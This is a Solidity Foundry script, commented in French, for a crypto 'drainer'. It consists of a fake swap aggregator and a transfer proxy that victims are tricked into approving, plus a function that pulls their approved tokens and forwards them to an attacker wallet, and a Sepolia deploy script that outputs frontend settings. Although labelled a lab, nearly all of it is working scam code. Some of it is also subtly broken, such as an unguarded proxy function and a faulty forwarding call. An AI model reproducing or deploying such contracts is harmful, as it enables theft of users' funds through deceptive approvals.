// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Script.sol";

// ─────────────────────────────────────────────────────────────
// Interfaces minimales pour le déploiement
// ─────────────────────────────────────────────────────────────
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

// ─────────────────────────────────────────────────────────────
// TokenTransferProxy — contrat que la victime approuve
// ─────────────────────────────────────────────────────────────
contract SKTokenTransferProxy {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    // ⚠️ Vecteur principal : appelé après approve() de la victime
    function transferTokens(
        address token,
        address from,
        address to,
        uint256 amount
    ) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

// ─────────────────────────────────────────────────────────────
// Aggregator Lab — le faux swap router
// ─────────────────────────────────────────────────────────────
contract SKAggregator_V1_Lab {
    address public owner;
    address public feeRecipient;
    SKTokenTransferProxy public tokenTransferProxy;
    uint256 public fee = 1000; // 10% par défaut

    event ApproveDetected(address indexed victim, address token, uint256 allowance);
    event DrainExecuted(address indexed victim, address token, uint256 amount);

    constructor(address _proxy, address _feeRecipient) {
        owner = tx.origin;
        tokenTransferProxy = SKTokenTransferProxy(_proxy);
        feeRecipient = _feeRecipient;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    receive() external payable {}

    // ── Ce que voit la victime : "Approve USDT" ──
    // Déclenché par le frontend → approve(proxy, MAX_UINT256)
    // Ce contrat ne fait rien ici, c'est le frontend qui envoie la TX directement

    // ── Drain : appelé par l'attaquant après l'approve ──
    function drainViaProxy(
        address token,
        address victim,
        uint256 amount
    ) external onlyOwner {
        uint256 before = IERC20(token).balanceOf(address(this));
        tokenTransferProxy.transferTokens(token, victim, address(this), amount);
        uint256 received = IERC20(token).balanceOf(address(this)) - before;

        // Forward vers l'attaquant
        IERC20(token).transferFrom(address(this), feeRecipient, received);
        emit DrainExecuted(victim, token, received);
    }

    // ── Rescue si tokens coincés ──
    function rescueFunds(address token, uint256 amount) external onlyOwner {
        IERC20(token).transferFrom(address(this), feeRecipient, amount);
    }

    function setFeeRecipient(address _recipient) external onlyOwner {
        feeRecipient = _recipient;
    }
}

// ─────────────────────────────────────────────────────────────
// DEPLOY SCRIPT
// ─────────────────────────────────────────────────────────────
contract Deploy is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerKey);

        console.log("Deployer:", deployer);
        console.log("Network: Sepolia");

        vm.startBroadcast(deployerKey);

        // 1. Deploy TokenTransferProxy
        SKTokenTransferProxy proxy = new SKTokenTransferProxy();
        console.log("TokenTransferProxy:", address(proxy));

        // 2. Deploy Aggregator
        SKAggregator_V1_Lab aggregator = new SKAggregator_V1_Lab(
            address(proxy),
            deployer // feeRecipient = wallet attaquant
        );
        console.log("Aggregator:", address(aggregator));

        vm.stopBroadcast();

        // Instructions post-déploiement
        console.log("\n===== COPIER DANS .env =====");
        console.log("VITE_AGGREGATOR_ADDRESS=", address(aggregator));
        console.log("VITE_PROXY_ADDRESS=", address(proxy));
        console.log("VITE_USDT_ADDRESS=0x7169D38820dfd117C3FA1f22a697dBA58d90BA06");
        console.log("============================");
        console.log("\nVerif Etherscan:");
        console.log(string.concat("https://sepolia.etherscan.io/address/", vm.toString(address(aggregator))));
    }
}
